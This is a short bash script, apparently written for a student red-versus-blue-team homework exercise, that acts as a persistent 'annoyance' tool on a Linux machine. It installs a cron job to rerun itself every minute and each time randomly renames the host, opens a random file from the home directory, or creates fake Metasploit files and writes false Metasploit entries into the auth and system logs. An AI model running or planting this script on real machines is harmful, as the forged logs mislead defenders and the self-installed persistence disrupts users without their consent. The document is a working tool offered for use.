#!/bin/bash
# Gihan W.
# The README and installation/usage instructions are on my HW4 report.

# Function to randomly change the hostname
change_hostname() {
    NEW_HOSTNAME="blue-team-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
    echo "Changing hostname to: $NEW_HOSTNAME"
    sudo hostnamectl set-hostname $NEW_HOSTNAME
}

# Function to open random files in the home directory
open_random_file() {
    RANDOM_FILE=$(find ~ -type f | shuf -n 1)
    echo "Opening random file: $RANDOM_FILE"
    xdg-open "$RANDOM_FILE" &
}

# Function to create the illusion that Metasploit is installed
fake_metasploit() {
    # Create fake Metasploit directories and files
    sudo mkdir -p /usr/local/metasploit-framework
    sudo touch /usr/local/metasploit-framework/metasploit.rb

    # Add misleading log messages to make it seem like Metasploit is running
    echo "Metasploit started: $(date)" | sudo tee -a /var/log/auth.log
    echo "Metasploit payloads initialized" | sudo tee -a /var/log/syslog


}

# Function to make the script persistent with cron every  minute
persist_cron_job() {
    # Set the cron job to run every minute
    (crontab -l 2>/dev/null | grep -v '~/anoy.sh'; echo "* * * * * ~/anoy.sh") | crontab -
    echo "Cron job set to run this script every minute."
}

# Function to execute random annoyance
random_annoyance() {
    case $((RANDOM % 3)) in
        0) change_hostname ;;
        1) open_random_file ;;
        2) fake_metasploit ;;
    esac
}

# Main loop for annoyance
random_annoyance

# Ensure persistence
persist_cron_job
